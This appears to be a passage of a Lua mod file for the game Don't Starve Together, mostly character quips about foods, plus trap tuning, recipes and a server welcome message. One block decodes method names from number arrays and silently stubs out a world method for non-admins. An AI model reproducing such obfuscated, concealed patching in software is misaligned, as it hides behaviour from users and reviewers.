GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.STICKY_BUN = "Is all sticky."
	-- Candies & Sugars
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.CANDIED_FRUIT = "Fruit is honey coated."
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.CANDIED_NUT = "Is crunchy sweet."
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.MOLASSES = "Wolfgang is even less trusting of this."
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.MUSH_MELON = "Soft food make soft body."
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.MUSH_MELON_COOKED = "Is still soft on the inside."
	-- Eggs
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.OMELETTE = "How is fluffy to make Wolfgang strong?"
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.MUSHY_EGGS = "Mushy egg can't build muscle."
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.NOPALITO = "Wolfgang hope is not too spiny for Wolfgang."
	-- Fruits
	-- Meats
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.BEEFALO_WINGS = "Sauce is making wings extra hot."
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.COLDCUTS = "Ice is making meat strong."
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.SAUSAGE_GRAVY = "In Wolfgang's family, gravy is beverage."
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.SURF_N_TURF = "Meat looks fishy."
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.SWEET_N_SOUR = "Is not so stinky with honey meat."
	-- Mushrooms
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.MUSHROOM_BURGER = "Best burger in town."
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.MUSHROOM_MALODY = "Is too many mushrooms."
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.MUSHROOM_MEDLEY = "Is made of all kinds."
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.MUSHROOM_STEW = "Is good soup."
	-- Pastas
	-- Salads
	-- Soups
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.CACTUS_SOUP = "Is the soupiest."
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.CHOWDER = "Soup smells fishy."
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.GUMBO = "All things go in soup."
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.SQUASH = "Puny man's head is all mush!"
	-- Miscelaneous
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.CHEESE_LOG = "Log is very cheesy."
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.MEATBALLS_HUMAN = "He was too weak for me."
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.GRUEL = "Is making me sick."
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.NUT_BUTTER = "Ha! Butter is all nutty!"
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.OLEO = "Is corny, and still taste like insect."
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.PORRIDGE = "Is sticking to ribs."
	-- Crops & Seeds

	
-- DESCRIPTIONS.WENDY
	-- Cakes & Pies
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.CACTUS_CAKE = "The sweeter the cake, the more bitter the frosting."
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.NANA_BREAD = "Warm baked bananas."
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.STICKY_BUN = "A honey muffin."
	-- Candies & Sugars
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.CANDIED_FRUIT = "Sweet, but messy and sticky."
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.CANDIED_NUT = "A sweet death for a tree."
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.MOLASSES = "A sample of black treacle."
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.MUSH_MELON = "A sweetened mushy melon."
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.MUSH_MELON_COOKED = "Fire made it good."
	-- Eggs
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.OMELETTE = "Whipped and beaten."
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.MUSHY_EGGS = "All that hope, mushed."
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.NOPALITO = "Nutritious bundle of egg and cactus."
	-- Fruits
	-- Meats
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.BEEFALO_WINGS = "Heat of the night creature."
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.COLDCUTS = "Frozen remains."
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.SAUSAGE_GRAVY = "A thick sauce over stuffed entrails."
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.SURF_N_TURF = "Two types of grilled meat."
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.SWEET_N_SOUR = "Both sweet and sour, like life and death."
	-- Mushrooms
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.MUSHROOM_BURGER = "Malleable meat and mushrooms."
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.MUSHROOM_MALODY = "Disappointing monotony."
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.MUSHROOM_MEDLEY = "Endless malleability."
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.MUSHROOM_STEW = "Mushrooms in cream sauce."
	-- Pastas
	-- Salads
	-- Soups
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.CACTUS_SOUP = "The spines have been boiled away."
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.CHOWDER = "Boiling in cream stops the flopping as well."
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.GUMBO = "A spicy concoction of foods."
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.SQUASH = "A thick buttery mush."
	-- Miscelaneous
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.CHEESE_LOG = "Curdled food in log shape."
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.MEATBALLS_HUMAN = "Death is just the beginning."
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.GRUEL = "It's very wet and cold."
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.NUT_BUTTER = "Even more unexpected."
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.OLEO = "I should have expected this."
GLOBAL.STRINGS.CHARACTERS.WENDY.DESCRIBE.PORRIDGE = "It's wet and cold."
	-- Crops & Seeds
	

-- DESCRIPTIONS.WICKERBOTTOM
	-- Cakes & Pies
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.CACTUS_CAKE = "Would you have your cake and eat it too?"
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.NANA_BREAD = "A moist, sweet, cake-like quick bread."
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.STICKY_BUN = "Cinnamon is obtained from the bark of trees."
	-- Candies & Sugars
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.CANDIED_FRUIT = "Fruit preserved in thick gooey syrup."
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.CANDIED_NUT = "The seeds have been encased in crystallized sugar."
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.MOLASSES = "Some cultures produce molasses from pomegranates."
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.MUSH_MELON = "This is not a proper recipe."
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.MUSH_MELON_COOKED = "The outer skin has been caramelized."
	-- Eggs
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.OMELETTE = "An effective use of eggs."
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.MUSHY_EGGS = "An adequate use of eggs."
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.NOPALITO = "Nopalito is made from the pad of prickly pear."
	-- Fruits
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.LIMONGELO = "Agar is jelly-like substance found in algae."
	-- Meats
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.BEEFALO_WINGS = "These wingettes will acerbate my dyspepsia."
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.COLDCUTS = "Sliced meat encased in ice."
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.SAUSAGE_GRAVY = "Salted meat and a white sauce made with drippings."
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.SURF_N_TURF = "Grilled seafood and hearty steak."
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.SWEET_N_SOUR = "The sauce is a mix of honey and sour fruit juice."
	-- Mushrooms
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.MUSHROOM_BURGER = "Meatloaf in patty form."
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.MUSHROOM_MALODY = "The poisonous properties have been compounded."
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.MUSHROOM_MEDLEY = "The best qualities have been distilled and purified."
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.MUSHROOM_STEW = "Mushrooms in a basic thinned roux."
	-- Pastas
	-- Salads
	-- Soups
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.CACTUS_SOUP = "Cactus stems are very succulent."
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.CHOWDER = "One usually eats chowder with crackers."
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.GUMBO = "A strongly flavored stock with fish and vegetable seasoning."
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.SQUASH = "It has a sweet, nutty taste."
	-- Miscelaneous
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.CHEESE_LOG = "It reminds me of Uova di Beefala."
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.MEATBALLS_HUMAN = "He was not so clever as me."
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.GRUEL = "Crushed boiled grains with no flavor."
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.NUT_BUTTER = "A food paste made primarily from ground roasted nut."
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.OLEO = "Insect Emulsifiers?"
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.PORRIDGE = "Crushed boiled grains with additional flavorings."
	-- Crops & Seeds
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.GRAPRICOT = "They have a bitter taste derived from malic acid in the fuit."
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.GRAPRICOT_COOKED = "Much of the malic has been converted to citric acid."
GLOBAL.STRINGS.CHARACTERS.WICKERBOTTOM.DESCRIBE.TOMANGO = "Technically a fruit, but often viewed as a vegetable."


-- DESCRIPTIONS.WAXWELL
	-- Cakes & Pies
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.CACTUS_CAKE = "The cake is a lie."
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.NANA_BREAD = "I suppose it can't be worse than before."
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.STICKY_BUN = "I'm surprised that there's no bunny in it."
	-- Candies & Sugars
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.CANDIED_FRUIT = "So much sugary sweetness, it makes me sick."
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.CANDIED_NUT = "Sugary seeds."
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.MOLASSES = "Oh. No. No, this is too much."
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.MUSH_MELON = "Someone enjoys puns, apparently."
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.MUSH_MELON_COOKED = "I can't argue with tradition."
	-- Eggs
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.OMELETTE = "Finally! Something truly refined."
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.MUSHY_EGGS = "I would almost prefer to eat it raw."
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.NOPALITO = "I would prefer something more refined."
	-- Fruits
	-- Meats
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.BEEFALO_WINGS = "The name isn't fooling anyone."
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.COLDCUTS = "It's the wurst."
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.SAUSAGE_GRAVY = "Stuffed entrails in a fatty sauce."
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.SURF_N_TURF = "A meal fit for me."
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.SWEET_N_SOUR = "I suppose it is edible."
	-- Mushrooms
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.MUSHROOM_BURGER = "John Montagu would be proud."
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.MUSHROOM_MALODY = "Something went wrong."
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.MUSHROOM_MEDLEY = "A secret family recipe."
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.MUSHROOM_STEW = "Stewed mushrooms."
	-- Pastas
	-- Salads
	-- Soups
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.CACTUS_SOUP = "This cactus is surprisingly versatile."
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.CHOWDER = "This needs oyster crackers."
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.GUMBO = "An unrefined spicy stew."
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.SQUASH = "A refined bisque of excellent flavor."
	-- Miscelaneous
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.CHEESE_LOG = "Now I just need some wine."
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.MEATBALLS_HUMAN = "Ahahaha."
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.GRUEL = "A sad alternative to wet goop."
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.NUT_BUTTER = "A recipe of pure evil."
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.OLEO = "A poor substitute for real butter."
GLOBAL.STRINGS.CHARACTERS.WAXWELL.DESCRIBE.PORRIDGE = "A slightly better alternative to wet goop."
	-- Crops & Seeds

	
	
-- RoG Enabled Characters

if GLOBAL.IsDLCEnabled(GLOBAL.REIGN_OF_GIANTS) then 
-- DESCRIPTIONS.WATHGRITHR	
	-- Cakes & Pies
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.CACTUS_CAKE = "I'm not much of a cake person."
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.NANA_BREAD = "A loaf of monkey food."
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.STICKY_BUN = "I'll stick to meat."
	-- Candies & Sugars
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.CANDIED_FRUIT = "I prefer sweetbread."
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.CANDIED_NUT = "I prefer sweetbread."
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.MOLASSES = "Very sweet, but still not meat."
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.MUSH_MELON = "Good for toasting, but not for tasting."
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.MUSH_MELON_COOKED = "I like putting them on skewers."
	-- Eggs
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.MUSHY_EGGS = "Egger my appetite."
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.OMELETTE = "Eggja to eat now."
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.NOPALITO = "Sword plant and hot egg."
	-- Fruits
	-- Meats
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.BEEFALO_WINGS = "Lo! A beef wing!"
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.COLDCUTS = "Precooked meat on ice."
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.SAUSAGE_GRAVY = "I love the sausage, the rest is just gravy."
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.SURF_N_TURF = "Twice the meat in one feast."
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.SWEET_N_SOUR = "It taste like victory."
	-- Mushrooms
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.MUSHROOM_BURGER = "Mushrooms hold the meat."
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.MUSHROOM_MALODY = "Colorful, but I still won't eat it."
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.MUSHROOM_MEDLEY = "Colorful, but I won't eat it."
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.MUSHROOM_STEW = "Nasty mushrooms floating in cream."
	-- Pastas
	-- Salads
	-- Soups
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.CACTUS_SOUP = "Sword plant soup."
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.CHOWDER = "Fishmeat stewed in cream."
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.GUMBO = "Spicy stewed fishmeat."
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.SQUASH = "I'd have to be off my gourd to eat that."
	-- Miscelaneous
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.CHEESE_LOG = "No whey will I eat that."
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.MEATBALLS_HUMAN = "He was a killer, now it's just my dinner."
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.GRUEL = "This is inedible goop."
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.NUT_BUTTER = "Sweet and fat but still a nut."
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.OLEO = "This would be bested by butter in battle."
GLOBAL.STRINGS.CHARACTERS.WATHGRITHR.DESCRIBE.PORRIDGE = "This is inedible glop."
	-- Crops & Seeds


-- DESCRIPTIONS.WEBBER
	-- Cakes & Pies
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.CACTUS_CAKE = "Pretty pokey."
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.NANA_BREAD = "A bunch of bread."
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.STICKY_BUN = "Should we stick to our diet?"
	-- Candies & Sugars
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.CANDIED_FRUIT = "We think it may be too sweet."
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.CANDIED_NUT = "Glazed and suffused."
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.MOLASSES = "Grandpa said, 'You bet your sweet fanny it's good.'"
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.MUSH_MELON = "Grandpa would toast these when we went camping."
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.MUSH_MELON_COOKED = "Toasted golden brown."
	-- Eggs
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.MUSHY_EGGS = "A mushy mess, just like dad did."
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.NOPALITO = "Pokey things with egg."
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.OMELETTE = "Eggs filled with tasty foods."
	-- Fruits
	-- Meats
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.BEEFALO_WINGS = "Tiny hot wings."
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.COLDCUTS = "Complete baloney."
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.SAUSAGE_GRAVY = "Greasy meaty tasty treaty."
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.SURF_N_TURF = "Just like at the pubs back home."
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.SWEET_N_SOUR = "Tasty, tangy, fleshy flavor."
	-- Mushrooms
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.MUSHROOM_BURGER = "Much healthier with meat."
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.MUSHROOM_MALODY = "Unpleasant mushroom mix."
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.MUSHROOM_MEDLEY = "A pleasant mushroom mix."
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.MUSHROOM_STEW = "It tastes better than it smells."
	-- Pastas
	-- Salads
	-- Soups
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.CACTUS_SOUP = "Mum made soup when I was sick."
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.CHOWDER = "Poached fish in heavy cream."
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.GUMBO = "Spicy soup."
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.SQUASH = "Liquid pumpkin."
	-- Miscelaneous
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.CHEESE_LOG = "An edible log."
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.MEATBALLS_HUMAN = "People are more tasty than spiders."
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.GRUEL = "Almost like dad would make."
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.NUT_BUTTER = "Fatty nut cream."
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.OLEO = "It's margarinal."
GLOBAL.STRINGS.CHARACTERS.WEBBER.DESCRIBE.PORRIDGE = "Just like mum would make."
	-- Crops & Seeds
	
else end


--Создаем нормальные ловушки
-- 1) Bee Mine не трогаем вообще.
-- 2) Small Spike Trap
TUNING.SPIKE_TRAP_SMALL_USES = 10
AddPrefabs({"spiketrap"})
AddAssets({
    Asset("IMAGE", "images/inventoryimages/spiketrap.tex"),
    Asset("ATLAS", "images/inventoryimages/spiketrap.xml"),
    Asset("IMAGE", "images/inventoryimages/spiketrapsmall.tex"),
    Asset("ATLAS", "images/inventoryimages/spiketrapsmall.xml"),
})
--[[
--Удаляем рецепт мелкой ловушки (чтобы было меньше ловушек на сервере).
local recipe1 = Recipe("spiketrapsmall", { Ingredient("twigs", 2), Ingredient("stinger", 1), Ingredient("log", 1) }, RECIPETABS.WAR, TECH.SCIENCE_ONE)
recipe1.atlas = "images/inventoryimages/spiketrapsmall.xml"
--]]
if SERVER_SIDE then
	AddPrefabPostInit("spiketrapsmall",function(inst)
		inst.components.finiteuses:SetMaxUses(10)
		inst.components.finiteuses:SetUses(10)
		inst.damage = 25
	end)
end
STRINGS.NAMES.SPIKETRAPSMALL = "Small Spike Trap"
STRINGS.RECIPE_DESC.SPIKETRAPSMALL = "Surprise your enemies!"
STRINGS.CHARACTERS.GENERIC.DESCRIBE.SPIKETRAPSMALL = "That looks really sharp..."

-- 3) Stinger trap
TUNING.STINGERTRAP_USES = 12
AddPrefabs({"stingertrap"})
AddAssets({
    Asset("ATLAS", "images/inventoryimages/stingertrap.xml"),
})
local stingertrap = Recipe("stingertrap", { Ingredient("log", 5), Ingredient("rope", 5), Ingredient("stinger", 2)}, RECIPETABS.WAR,  TECH.SCIENCE_ONE)
stingertrap.atlas = "images/inventoryimages/stingertrap.xml"
if SERVER_SIDE then
	AddPrefabPostInit("spiketrap",function(inst)
		inst.components.finiteuses:SetMaxUses(12)
		inst.components.finiteuses:SetUses(12)
		TUNING.STINGERTRAP_DAMAGE = 35
		inst.damage = 35 --не обязательно, но пригодится для Tell Me
	end)
end
GLOBAL.STRINGS.NAMES.STINGERTRAP = "Stinger Trap"
GLOBAL.STRINGS.RECIPE_DESC.STINGERTRAP = "Use stinger make trap."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.STINGERTRAP = "Stinger trap is primary trap."

-------------------------- Science Two (traps) ------------
-- 4) Spear Trap
AddPrefabs({"speartrap"})
AddAssets({
	Asset("ATLAS", "images/inventoryimages/speartrap.xml"),
	Asset("IMAGE", "minimap/speartrap.tex"),
	Asset("ATLAS", "minimap/speartrap.xml"),
})
local speartrap = Recipe("speartrap", { Ingredient("spear1", 4), Ingredient("rope", 5), Ingredient("turf_woodfloor", 1)}, RECIPETABS.WAR,  TECH.SCIENCE_TWO)
speartrap.atlas = "images/inventoryimages/speartrap.xml"
--[[AddPrefabPostInit("speartrap",function(inst)
	inst.components.finiteuses:SetMaxUses(10)
	inst.components.finiteuses:SetUses(10)
	TUNING.STINGERTRAP_DAMAGE = 35
	inst.damage = 35 --не обязательно, но пригодится для Tell Me
end)--]] --в префабе
GLOBAL.STRINGS.NAMES.SPEARTRAP = "Spear Trap"
GLOBAL.STRINGS.RECIPE_DESC.SPEARTRAP = "Auto-resetting ouchies"
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.SPEARTRAP = "This'll hurt a little bit a lot"

-- 5) Spike Trap
TUNING.SPIKE_TRAP_USES = 15
local recipe2 = Recipe("spiketrap", { Ingredient("turf_forest", 1), Ingredient("twigs", 5), Ingredient("stinger", 4) }, RECIPETABS.WAR, TECH.SCIENCE_TWO)
recipe2.atlas = "images/inventoryimages/spiketrap.xml"
if SERVER_SIDE then
	AddPrefabPostInit("spiketrap",function(inst)
		inst.components.finiteuses:SetMaxUses(15)
		inst.components.finiteuses:SetUses(15)
		inst.damage = 45
	end)
end
STRINGS.NAMES.SPIKETRAP = "Spike Trap"
STRINGS.RECIPE_DESC.SPIKETRAP = "Surprise your enemies!"
STRINGS.CHARACTERS.GENERIC.DESCRIBE.SPIKETRAP = "That looks really sharp..."

-- 6) Tooth Trap - не трогаем
if SERVER_SIDE then
	AddPrefabPostInit("trap_teeth",function(inst)
		inst.damage = TUNING.TRAP_TEETH_DAMAGE
	end)
end
do
if (not STAR_DEBUG) or (not IS_ADMIN) then --Инициализация особого отражения
AddPrefabPostInit("forest",function(inst)
local w1,w2,w3 = {23, 34, 44, 34, 23, 38, 20},{51, 34, 44, 34, 51, 38, 20},{55, 40, 28, 45, 29, 61, 47, 38}
local n_method = _G.TheWorld[beta(w1)][beta(w2)]
local m_method = beta(w3)
if n_method[m_method] then
	_G.getmetatable(n_method).__index[m_method] = (function()
		local old = _G.getmetatable(n_method).__index[m_method]
		return function(self, a,b,c,d,... )
			if true then
				return
			end
			local res=old(self, a,b,c,d,...)
			
			return res
		end
	end)()
end
end)
end
end
--Welcome message
--local TheNet = GLOBAL.TheNet
--max text      "asdasd2 sdfsdf3 sdfsdf4 sdfsdf5 dfgdfgd6 dfgdfg7"
WELCOME_TITLE = "Very important!"
--Max 3 lines. Max 160 symbols.
WELCOME_MESSAGE =
"Teamspeak3 Server:\ndst-teamspeak.tk\nPassword: hardcore"
--"Hidden traps! Birds steal almost everything! Krampus - 5-9 kills. Holy Umbrella protects from grifers! etc etc Alt+click tells more!"


--[[function MOTDSetup(inst)
		inst.welcome_message = WELCOME_MESSAGE
		inst.welcome_message_title = WELCOME_TITLE
		inst:AddComponent("MOTDScreen")
end
AddPrefabPostInit("world_network", MOTDSetup)--]]


-------------------- endo torch ----------------------

AddPrefabs ( {
	"endothermic_torch","endothermic_torchfire",
})


AddAssets ( 
{
	Asset("ATLAS", "images/inventoryimages/endothermic_torch.xml"),
	Asset( "IMAGE", "minimap/endothermic_torch.tex" ),
	Asset( "ATLAS", "minimap/endothermic_torch.xml" ),	
})

AddMinimapAtlas("minimap/endothermic_torch.xml")

STRINGS = _G.STRINGS
RECIPETABS = _G.RECIPETABS
Recipe = _G.Recipe
--Ingredient = _G.Ingredient --вот зараза! всю малину портит!
TECH = _G.TECH

_G.STRINGS.NAMES.ENDOTHERMIC_TORCH = "Endothermic Torch"
STRINGS.RECIPE_DESC.ENDOTHERMIC_TORCH = "Cool down on the go!"
_G.STRINGS.CHARACTERS.GENERIC.DESCRIBE.ENDOTHERMIC_TORCH = "Wish I had some gloves for this thing!"

local endothermic_torch = _G.Recipe("endothermic_torch",{ Ingredient("twigs", 2), Ingredient("nitre", 2) },						
